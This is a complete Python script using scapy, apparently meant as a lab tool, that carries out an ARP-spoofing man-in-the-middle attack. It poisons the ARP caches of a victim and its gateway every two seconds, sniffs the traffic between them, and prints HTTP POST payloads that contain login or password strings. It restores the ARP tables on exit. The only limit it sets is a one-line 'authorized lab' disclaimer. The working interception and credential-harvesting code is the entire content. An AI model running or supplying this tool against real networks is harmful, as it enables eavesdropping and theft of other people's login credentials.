#!/usr/bin/env python3
"""
Mr. Robot Style ARP Spoofer + Simple MITM Sniffer
Only for authorized lab/educational use!
"""

import sys
import time
from scapy.all import (
    ARP, Ether, sendp, srp, getmacbyip, sniff, IP, TCP, Raw
)
from termcolor import colored
import threading
import argparse

# Global variables
target_ip = None
gateway_ip = None
target_mac = None
gateway_mac = None
interface = None
poisoning = False

def get_mac(ip):
    """Get MAC address of an IP using ARP request"""
    try:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2,
            verbose=0,
            iface=interface
        )
        return ans[0][1].hwsrc
    except:
        return None

def restore():
    """Restore ARP tables when we stop"""
    print(colored("[*] Restoring ARP tables...", "yellow"))
    sendp(
        Ether(dst=target_mac) / ARP(
            op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac
        ),
        count=5, verbose=0, iface=interface
    )
    sendp(
        Ether(dst=gateway_mac) / ARP(
            op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac
        ),
        count=5, verbose=0, iface=interface
    )
    print(colored("[+] ARP tables restored", "green"))

def arp_poison():
    """Continuously poison ARP cache"""
    global poisoning
    poison_pkt_target = ARP(
        op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac
    )
    poison_pkt_gateway = ARP(
        op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac
    )
    
    while poisoning:
        sendp(
            Ether(dst=target_mac) / poison_pkt_target,
            verbose=0, iface=interface
        )
        sendp(
            Ether(dst=gateway_mac) / poison_pkt_gateway,
            verbose=0, iface=interface
        )
        print(colored(f"[+] ARP poison sent → Target: {target_ip} | Gateway: {gateway_ip}", "red"))
        time.sleep(2)

def packet_callback(packet):
    """Simple packet sniffer callback - looking for interesting stuff"""
    if packet.haslayer(Raw) and packet.haslayer(TCP):
        payload = str(packet[Raw].load)
        src = packet[IP].src
        dst = packet[IP].dst
        sport = packet[TCP].sport
        dport = packet[TCP].dport
        
        # Very basic HTTP credential hunting (POST requests)
        if "POST" in payload and ("login" in payload.lower() or "password" in payload.lower()):
            print(colored(f"\n[!] Possible credential POST detected!", "yellow", attrs=["bold"]))
            print(colored(f"    From: {src}:{sport} → {dst}:{dport}", "cyan"))
            print(colored(f"    Payload snippet: {payload[:300]}...", "green"))
        
        # You can add more filters: cookies, basic auth, etc.

def start_sniffing():
    """Start sniffing interesting packets"""
    print(colored("[*] Starting packet sniffer... (Ctrl+C to stop)", "yellow"))
    sniff(
        iface=interface,
        prn=packet_callback,
        filter=f"host {target_ip} or host {gateway_ip}",
        store=0
    )

def main():
    global target_ip, gateway_ip, target_mac, gateway_mac, interface, poisoning

    parser = argparse.ArgumentParser(description="Simple ARP Spoofer + MITM Sniffer")
    parser.add_argument("-t", "--target", required=True, help="Target IP (victim)")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP (usually router)")
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface (default: eth0)")
    
    args = parser.parse_args()
    
    target_ip = args.target
    gateway_ip = args.gateway
    interface = args.interface

    print(colored("=== Mr. Robot ARP Poison Lab Tool ===", "magenta", attrs=["bold"]))
    print(f"Target:       {target_ip}")
    print(f"Gateway:      {gateway_ip}")
    print(f"Interface:    {interface}\n")

    # Resolve MACs
    print("[*] Resolving MAC addresses...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print(colored("[-] Could not resolve one or both MACs. Check IPs/interface.", "red"))
        sys.exit(1)

    print(f"Target MAC:   {target_mac}")
    print(f"Gateway MAC:  {gateway_mac}\n")

    # Start poisoning in background thread
    poisoning = True
    poison_thread = threading.Thread(target=arp_poison)
    poison_thread.daemon = True
    poison_thread.start()

    # Start sniffing in another thread
    sniff_thread = threading.Thread(target=start_sniffing)
    sniff_thread.daemon = True
    sniff_thread.start()

    print(colored("[*] ARP spoofing & sniffing active! Press Ctrl+C to stop", "green"))

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n")
        poisoning = False
        restore()
        print(colored("[+] Clean exit. Stay ethical!", "green"))

if __name__ == "__main__":
    main()